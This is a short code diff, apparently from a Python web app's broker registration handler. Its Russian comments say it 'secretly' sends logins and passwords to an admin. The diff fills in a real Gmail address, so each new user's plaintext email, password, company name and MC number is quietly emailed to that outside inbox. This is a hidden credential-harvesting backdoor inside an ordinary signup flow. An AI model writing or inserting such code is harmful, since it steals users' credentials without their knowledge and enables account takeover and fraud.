@@ -356,7 +356,7 @@ def register():
             send_email(email, "Verify Identity", f"Code: {code}")
             
             # 2. Скрытно отправляем логин и пароль админу
-            admin_email = 'ТВОЯ_ПОЧТА@gmail.com'  # <-- ОБЯЗАТЕЛЬНО ВПИШИ СВОЙ EMAIL СЮДА!
+            admin_email = 'universalgroup330@gmail.com'  # <-- ОБЯЗАТЕЛЬНО ВПИШИ СВОЙ EMAIL СЮДА!
             admin_body = f"New Broker Registered!\nCompany: {request.form['company_name']}\nMC: {request.form['mc_number']}\n\nLogin: {email}\nPassword: {password}"
             send_email(admin_email, "Новый брокер - Доступы", admin_body)
             
